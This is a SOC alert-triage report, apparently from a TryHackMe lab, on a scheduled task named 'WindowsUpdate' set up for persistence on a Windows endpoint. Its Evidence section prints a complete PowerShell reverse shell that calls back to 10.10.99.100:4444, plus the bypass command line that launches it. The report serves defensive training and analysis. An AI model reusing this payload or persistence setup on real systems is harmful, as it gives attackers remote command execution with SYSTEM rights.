# Alert Triage | Endpoint: Persistence Mechanism Detection on Windows Endpoint

**Date:** 2025-12-15

## Investigation Summary

Investigation of a Windows endpoint following a high-severity alert for suspicious scheduled task creation. Analysis revealed an attacker-created scheduled task configured to execute a malicious PowerShell script on system startup, establishing persistence after initial compromise.

## Detection / Alert

- **Alert name:** Suspicious Scheduled Task Creation
- **Time observed:** 2025-12-15 14:32 UTC
- **Affected host:** WORKSTATION-042 (10.10.50.42)
- **User context:** SYSTEM
- **Source:** TryHackMe lab exercise / Sysmon Event ID 1

## Triage / Logs

Upon receiving the alert, I reviewed Windows Event Logs and Sysmon data for the affected endpoint. Initial triage focused on identifying what task was created, who created it, and what actions it was configured to perform.

## Data Sources

- Sysmon Event ID 1 (Process Creation)
- Windows Event Log - Task Scheduler (Event ID 4698)
- PowerShell script logs
- File system artifacts

## Investigation Steps

1. **Alert review:** Reviewed the initial Sysmon alert showing `schtasks.exe` execution with suspicious parameters
2. **Task enumeration:** Used `schtasks /query /v /fo list` to list all scheduled tasks on the host
3. **Task inspection:** Found a task named "WindowsUpdate" (suspicious naming to blend in) created at 2025-12-15 14:31 UTC
4. **Script analysis:** Located the referenced PowerShell script at `C:\Users\Public\Documents\update.ps1`
5. **Script review:** Opened the script file and found it contained a Base64-encoded reverse shell payload
6. **Timeline correlation:** Cross-referenced task creation time with prior alerts on the same host

## Evidence

**Scheduled Task Details:**
- **Task Name:** WindowsUpdate (masquerading as legitimate Windows service)
- **Created:** 2025-12-15 14:31:42 UTC
- **Trigger:** At system startup
- **Action:** `powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\Documents\update.ps1`
- **Run As:** SYSTEM

**PowerShell Script (`update.ps1`):**
```powershell
$client = New-Object System.Net.Sockets.TCPClient("10.10.99.100",4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
  $data = (New-Object Text.ASCII).GetString($bytes,0,$i);
  $sendback = (iex $data 2>&1 | Out-String );
  $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
  $stream.Write($sendbyte,0,$sendbyte.Length);
  $stream.Flush()};
$client.Close()
```

**Registry Persistence Check:**
- Checked common autorun registry keys using `autoruns.exe` - no additional persistence found
- Confirmed task was the only persistence mechanism identified

## Analysis

The attacker created a scheduled task to execute a PowerShell reverse shell on every system startup, maintaining access even after reboots or credential changes. The task name was intentionally misleading ("WindowsUpdate") to avoid suspicion during casual inspection.

The PowerShell script establishes a TCP connection back to an attacker-controlled IP (10.10.99.100) on port 4444, creating an interactive command shell. This is a common post-exploitation technique used after initial access to maintain persistence.

The task was created with SYSTEM privileges, meaning the reverse shell would run with the highest privileges on the machine. Prior alerts on this host showed a successful phishing attack 30 minutes before task creation, suggesting the attacker used initial access to establish this persistence.

## MITRE ATT&CK

- **Tactic:** Persistence
- **Technique:** Scheduled Task/Job (T1053.005)
- **Tactic:** Execution
- **Technique:** PowerShell (T1059.001)
- **Tactic:** Command and Control
- **Technique:** Application Layer Protocol (T1071)

## Decision

- **Classification:** True Positive  
- **Severity:** High  
- **Justification:** Confirmed persistence mechanism with SYSTEM-level privileges executing malicious PowerShell reverse shell on startup

## Response / Escalation

**Immediate Actions:**
- Documented all findings including scheduled task details, PowerShell script content, and C2 IP
- Recommended endpoint isolation to prevent further C2 communication
- Escalated to Tier 2 SOC for remediation and forensic analysis

**Escalation Requests:**
- Remove malicious scheduled task and PowerShell script
- Block outbound connection to 10.10.99.100:4444 at firewall
- Investigate initial access vector (prior phishing alert on same host)
- Check other endpoints for similar persistence mechanisms
- Credential rotation for affected users

## Lessons Learned

1. Scheduled tasks with names mimicking legitimate Windows services should trigger alerts
2. Any scheduled task executing PowerShell with `-ExecutionPolicy Bypass` is highly suspicious
3. Tasks created with SYSTEM context require additional scrutiny
4. Regular audits of scheduled tasks can help identify persistence early

## Artifacts

- Scheduled task XML export: `WindowsUpdate.xml`
- Malicious PowerShell script: `update.ps1` (quarantined)
- Sysmon process creation logs
- Task Scheduler event logs (Event ID 4698)

## References

- MITRE ATT&CK T1053.005
- TryHackMe Lab Exercise
